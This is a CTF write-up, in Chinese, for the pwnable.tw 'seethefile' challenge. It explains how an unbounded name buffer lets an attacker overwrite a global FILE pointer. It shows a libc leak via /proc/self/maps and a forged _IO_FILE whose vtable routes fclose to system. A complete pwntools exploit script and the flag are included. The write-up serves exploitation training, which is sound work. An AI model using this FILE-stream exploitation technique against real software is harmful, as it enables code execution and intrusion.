# seethefile


```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

給了 binary, glibc 2.23


name 長度沒有限制，在 bss 往高位方向寫入，可以控 fp

```c=
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char nptr[32]; // [esp+Ch] [ebp-2Ch] BYREF
  unsigned int v5; // [esp+2Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  init();
  welcome();
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%s", nptr);
    switch ( atoi(nptr) )
    {
      case 1:
        openfile();
        break;
      case 2:
        readfile();
        break;
      case 3:
        writefile();
        break;
      case 4:
        closefile();
        break;
      case 5:
        printf("Leave your name :");
        __isoc99_scanf("%s", name);
        printf("Thank you %s ,see you next time\n", name);
        if ( fp )
          fclose(fp);
        exit(0);
        return result;
      default:
        puts("Invaild choice");
        exit(0);
        return result;
    }
  }
}
```


```c=
.bss:0804B060
.bss:0804B060 ; Segment type: Uninitialized
.bss:0804B060 ; Segment permissions: Read/Write
.bss:0804B060 _bss            segment align_32 public 'BSS' use32
.bss:0804B060                 assume cs:_bss
.bss:0804B060                 ;org 804B060h
.bss:0804B060                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.bss:0804B060                 public stdout@@GLIBC_2_0
.bss:0804B060 ; FILE *stdout
.bss:0804B060 stdout@@GLIBC_2_0 dd ?                  ; DATA XREF: LOAD:080482E0↑o
.bss:0804B060                                         ; init+6↑r
.bss:0804B060                                         ; Alternative name is 'stdout'
.bss:0804B060                                         ; Copy of shared data
.bss:0804B064 completed_7200  db ?                    ; DATA XREF: __do_global_dtors_aux↑r
.bss:0804B064                                         ; __do_global_dtors_aux+14↑w
.bss:0804B065                 align 20h
.bss:0804B080                 public filename
.bss:0804B080 ; char filename[64]
.bss:0804B080 filename        db 40h dup(?)           ; DATA XREF: openfile+53↑o
.bss:0804B080                                         ; openfile+6D↑o ...
.bss:0804B0C0                 public magicbuf
.bss:0804B0C0 ; char magicbuf[416]
.bss:0804B0C0 magicbuf        db 1A0h dup(?)          ; DATA XREF: openfile+33↑o
.bss:0804B0C0                                         ; readfile+17↑o ...
.bss:0804B260                 public name
.bss:0804B260 ; char name[32]
.bss:0804B260 name            db 20h dup(?)           ; DATA XREF: main+9F↑o
.bss:0804B260                                         ; main+B4↑o
.bss:0804B280                 public fp
.bss:0804B280 ; FILE *fp
.bss:0804B280 fp              dd ?                    ; DATA XREF: openfile+6↑r
.bss:0804B280                                         ; openfile+AD↑w ...
.bss:0804B280 _bss            ends
.bss:0804B280
.prgend:0804B284 ; ===========================================================================
.prgend:0804B284
.prgend:0804B284 ; Segment type: Zero-length
.prgend:0804B284 _prgend         segment byte public '' use32
.prgend:0804B284 _end            label byte
.prgend:0804B284 _prgend         ends
.prgend:0804B284
```




功能

- 開啟檔案 (open)：
    - 呼叫 fopen 函數開啟指定的檔案，但不能開啟名為 flag 的檔案
    - 檔案指標會被儲存在全域變數 fp 中
```c=
int openfile()
{
  if ( fp )
  {
    puts("You need to close the file first");
    return 0;
  }
  else
  {
    memset(magicbuf, 0, 0x190u);
    printf("What do you want to see :");
    __isoc99_scanf("%63s", filename);
    if ( strstr(filename, "flag") )
    {
      puts("Danger !");
      exit(0);
    }
    fp = fopen(filename, "r");
    if ( fp )
      return puts("Open Successful");
    else
      return puts("Open failed");
  }
}
```
- 讀取檔案內容 (read)：
    - 根據全域變數 fp 指向的檔案，讀取 0x18f 位元組的資料，並將其存放到全域變數 magicbuf 中
- 輸出檔案內容 (write)：
    - 印出 magicbuf 中的內容，但不能包含字串 flag、FLAG 或 } 
- 關閉檔案 (close)：
    - 呼叫 fclose 關閉目前由 fp 所指向的檔案
```c=
int closefile()
{
  int result; // eax

  if ( fp )
    result = fclose(fp);
  else
    result = puts("Nothing need to close");
  fp = 0;
  return result;
}
```
- 退出程序 (exit)：
    - 使用者可以輸入一串字符，這些字符將會存放在全域變數 name 中
    - 如果 fp 不為空，則在退出時會呼叫 fclose(fp) 來關閉檔案。



利用 fclose(fp)，觸發 /bin/sh

故這邊要建構一個 file 結構，file 的 vtable 的 pointer 指到 __finish(system) 


因為要偽造結構 vtable 指到 system，需要 libc base，利用題目提供的功能

```
open /proc/self/maps
read
read
write
```

```
08048000-0804a000 r-xp 00000000 08:00 249799                             /home/seethefile/seethefile
0804a000-0804b000 r--p 00001000 08:00 249799                             /home/seethefile/seethefile
0804b000-0804c000 rw-p 00002000 08:00 249799                             /home/seethefile/seethefile
08d63000-08d85000 rw-p 00000000 00:00 0                                  [heap]
f75c5000-f7772000 r-xp 00000000 08:00 2652247                            /lib32/libc-2.23.so
f7772000-f7773000 ---p 001ad000 08:00 2652247                            /lib32/libc-2.23.so
f7773000-f7775000 r--p 001ad000 08:00 2652247                            /lib32/libc-2.23.so
f7775000-f7776000 rw-p 001af000 08:00 2652247                            /lib32/libc-2.23.so
```




```c=

// libio/libio.h

struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
#if defined _G_IO_IO_FILE_VERSION && _G_IO_IO_FILE_VERSION == 0x20001
  _IO_off64_t _offset;
# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
# else
  void *__pad1;
  void *__pad2;
  void *__pad3;
  void *__pad4;
# endif
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
#endif
};

extern struct _IO_FILE_plus _IO_2_1_stdin_;
extern struct _IO_FILE_plus _IO_2_1_stdout_;
extern struct _IO_FILE_plus _IO_2_1_stderr_;




struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
...
}

struct _IO_FILE_plus  // fopen return
{
  _IO_FILE file;   //size 0x94
  const struct _IO_jump_t *vtable;
};


// fclose

  _IO_acquire_lock (fp);
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_file_close_it (fp);            
  else
    status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;
  _IO_release_lock (fp);
  _IO_FINISH (fp);


_IO_IS_FILEBUF        0x2000
```

當 _flags & _IO_IS_FILEBUF 為 0 時，就會直接調用 _IO_FINSH(fp) 相當於 fp -> vtable -> _finish(fp)

將 _flags 設為 0xffffdfff ， 0xffffdfff&0x2000=0

read_ptr 設為 ";sh"
__finish 設為 system


```
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

elf = ELF('./seethefile')
libc = ELF('./libc_32.so.6')
r = remote('chall.pwnable.tw', 10200)



r.sendlineafter('choice :', '1')
r.sendlineafter('see :', "/proc/self/maps")
r.sendlineafter('choice :', '2')
r.sendlineafter('choice :', '2')
r.sendlineafter('choice :', '3')
r.recvuntil("\n")
libc.address = int(r.recv(8), 16)

system_addr = libc.sym['system']


FILE = 0x0804B284 # at .prgend section
_IO_FILE_SIZE = 0x94
payload = b'a' * 0x20  # padding name buffer
payload += p32(FILE)   # structor address at .prgend section
#payload += (p32(0xffffdfff) + b';/bin/sh\x00').ljust(_IO_FILE_SIZE, b'\x00')
payload += (p32(0xffffdfff) + b';sh').ljust(_IO_FILE_SIZE, b'\x00')
payload += p32(FILE + _IO_FILE_SIZE + 0x4)
payload += p32(system_addr) * 3


r.sendlineafter('choice :', '5')
r.sendlineafter('name :', payload)
r.sendline("whoami;date")
r.interactive()
```

vtable函數指標在被呼叫時會傳該物件作為參數，所以會傳 `_IO_FILE_plus`，所以 `p32(0xffffdfff) + b';/bin/sh\x00'` 會被當成字串，所以才要再加上 `;`



>FLAG{F1l3_Str34m_is_4w3s0m3}


Ref
- https://github.com/skyedai910/wiki.mrskye.cn/blob/master/docs/Pwn/IO_FILE/Pwn_IO_FILE.md
- https://firmianay.gitbook.io/ctf-all-in-one/4_tips/4.13_io_file
- https://b0ldfrev.gitbook.io/note/pwn/iofile-li-yong-si-lu-zong-jie#li-yong-iostrfinsh